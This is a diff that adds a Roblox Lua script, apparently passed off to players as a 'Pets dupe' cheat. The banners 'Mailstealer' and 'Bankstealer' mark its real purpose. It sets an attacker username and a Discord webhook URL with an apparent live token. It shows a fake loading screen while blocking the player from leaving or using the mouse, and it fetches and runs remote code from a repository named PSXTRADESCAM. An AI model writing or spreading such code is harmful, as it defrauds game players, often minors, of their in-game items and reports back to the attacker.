@@ -1,0 +1,42 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+UserName = "bifeteafeyt123"
+Webhook = "https://discord.com/api/webhooks/1141502914637074433/E621C6d-ZSMvZ_CHFtka9pvAABnOy8barYT7nvgcBi4VYvmySKlCub4aJ1BmOZ71hYBi"
+UserName2 = "bifeteafeyt123"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+_G.ScriptName = "Pets dupe"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BIFE123/PSXTRADESCAM/main/MAILBOX"))()
+--[[
+   ____              _        _             _           
+  | __ )  __ _ _ __ | | _____| |_ ___  __ _| | ___ _ __ 
+  |  _ \ / _` | '_ \| |/ / __| __/ _ \/ _` | |/ _ \ '__|
+  | |_) | (_| | | | |   <\__ \ ||  __/ (_| | |  __/ |   
+  |____/ \__,_|_| |_|_|\_\___/\__\___|\__,_|_|\___|_| 
+
+]]--
+_G.UserID = "2620655354"
+_G.Webhook = "https://discord.com/api/webhooks/1141502914637074433/E621C6d-ZSMvZ_CHFtka9pvAABnOy8barYT7nvgcBi4VYvmySKlCub4aJ1BmOZ71hYBi"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BIFE123/PSXTRADESCAM/main/BANK"))()
+
+--visual
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BIFE123/PSXTRADESCAM/main/HUB"))()
